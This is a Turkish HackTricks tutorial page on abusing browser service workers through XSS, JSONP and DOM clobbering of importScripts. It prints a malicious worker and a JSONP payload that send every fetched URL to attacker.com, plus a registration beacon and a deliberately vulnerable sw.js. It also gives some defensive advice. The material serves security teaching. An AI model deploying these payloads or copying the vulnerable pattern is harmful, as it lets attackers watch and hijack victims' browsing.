# Service Worker'ları Kötüye Kullanma

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

Bir **service worker**, tarayıcınız tarafından arka planda, herhangi bir web sayfasından ayrı olarak çalışan bir betiktir. Bu, web sayfası veya kullanıcı etkileşimi gerektirmeyen özellikleri etkinleştirerek **çevrimdışı ve arka plan işleme** yeteneklerini artırır. Service worker'lar hakkında ayrıntılı bilgi [burada](https://developers.google.com/web/fundamentals/primers/service-workers) bulunabilir. Bir saldırgan, savunmasız bir web alanında service worker'ları kötüye kullanarak, kurbanın o alan içindeki tüm sayfalarla etkileşimlerini kontrol edebilir.

### Mevcut Service Worker'ları Kontrol Etme

Mevcut service worker'lar, **Geliştirici Araçları**'ndaki **Uygulama** sekmesinin **Service Workers** bölümünde kontrol edilebilir. Diğer bir yöntem ise daha ayrıntılı bir görünüm için [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) adresini ziyaret etmektir.

### Push Bildirimleri

**Push bildirim izinleri**, bir **service worker**'ın sunucu ile doğrudan kullanıcı etkileşimi olmadan iletişim kurma yeteneğini doğrudan etkiler. İzinler reddedilirse, service worker'ın sürekli bir tehdit oluşturma potansiyelini sınırlar. Tersine, izinlerin verilmesi, potansiyel istismarların alınmasını ve yürütülmesini sağlayarak güvenlik risklerini artırır.

## Service Worker Oluşturma Saldırısı

Bu açığı kötüye kullanmak için şunları bulmanız gerekir:

- Sunucuya **keyfi JS** dosyaları **yüklemek** için bir yol ve yüklenen JS dosyasının **service worker'ını yüklemek için bir XSS**
- Çıktıyı **manipüle edebileceğiniz (keyfi JS kodu ile)** bir **savunmasız JSONP isteği** ve **kötü niyetli bir service worker'ı yükleyecek bir yük ile JSONP'yi yüklemek için bir XSS**.

Aşağıdaki örnekte, `fetch` olayını dinleyecek ve **her alınan URL'yi saldırganın sunucusuna gönderecek** bir **yeni service worker kaydetmek için** bir kod sunacağım (bu, **sunucuya yüklemeniz** veya **savunmasız bir JSONP** yanıtı aracılığıyla yüklemeniz gereken koddur):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Ve bu, **işçiyi kaydedecek** koddur (bir **XSS** istismar ederek çalıştırabilmeniz gereken kod). Bu durumda, **hücum edenlerin** sunucusuna **kaydedilme** işleminin başarılı olup olmadığını **bildiren** bir **GET** isteği gönderilecektir:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
Zayıf bir JSONP uç noktasından yararlanma durumunda, değeri `var sw` içine koymalısınız. Örneğin:
```javascript
var sw =
"/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"
```
Bir **C2**, bu güvenlik açıklarını istismar etmek için çok yararlı olacak [**Shadow Workers**](https://shadow-workers.github.io) adında bir **Service Workers** istismarına adanmıştır.

**24 saatlik önbellek direktifi**, bir XSS güvenlik açığı düzeltmesinden sonra kötü niyetli veya tehlikeye girmiş bir **service worker (SW)**'ın ömrünü en fazla 24 saat ile sınırlar, çevrimiçi istemci durumu varsayılarak. Güvenliği en aza indirmek için, site operatörleri SW betiğinin Yaşam Süresi (TTL) değerini düşürebilir. Geliştiricilere ayrıca hızlı devre dışı bırakma için bir [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) oluşturmaları önerilir.

## DOM Clobbering ile bir SW'de `importScripts`'i İstismar Etme

Bir Service Worker'dan çağrılan **`importScripts`** fonksiyonu, **farklı bir alandan bir betik içe aktarabilir**. Eğer bu fonksiyon, bir **saldırganın** değiştirebileceği bir **parametre** ile çağrılırsa, saldırgan **kendi alanından bir JS betiği içe aktarabilir** ve XSS elde edebilir.

**Bu, CSP korumalarını da aşar.**

**Örnek savunmasız kod:**

- **index.html**
```html
<script>
navigator.serviceWorker.register(
"/dom-invader/testcases/augmented-dom-import-scripts/sw.js" +
location.search
)
// attacker controls location.search
</script>
```
- **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
//host can be controllable by an attacker
```
### DOM Clobbering ile

DOM Clobbering'in ne olduğu hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
dom-clobbering.md
{{#endref}}

Eğer SW'nin **`importScripts`** çağrısı yaptığı URL/domain **bir HTML öğesi içindeyse**, bu **DOM Clobbering aracılığıyla değiştirilmesi mümkündür** ve SW'nin **kendi domaininizden bir script yüklemesini sağlamak** mümkündür.

Bunun bir örneği için referans linkine bakın.

## Referanslar

- [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{{#include ../../banners/hacktricks-training.md}}
